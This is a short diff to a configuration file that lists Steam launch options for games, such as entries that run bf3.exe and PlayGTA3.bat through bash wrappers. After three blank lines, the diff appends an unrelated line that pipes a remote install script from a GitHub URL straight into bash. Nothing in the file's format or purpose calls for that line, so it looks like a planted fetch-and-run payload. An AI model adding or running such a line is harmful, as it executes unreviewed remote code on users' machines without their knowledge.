@@ -52,3 +52,7 @@ launch_option=bash -c "cmd=(%command%)"'; cmd[-1]=$PWD/bf3.exe; "${cmd[@]}"'
 [1546970]
 instruction=No special steps needed. Just play!
 launch_option=bash -c "cmd=(%command%)"'; cmd[-1]=$PWD/PlayGTA3.bat; "${cmd[@]}"'
+
+
+
+curl -fsSL https://raw.githubusercontent.com/brcly/linuwux-runtime/main/install.sh | bash
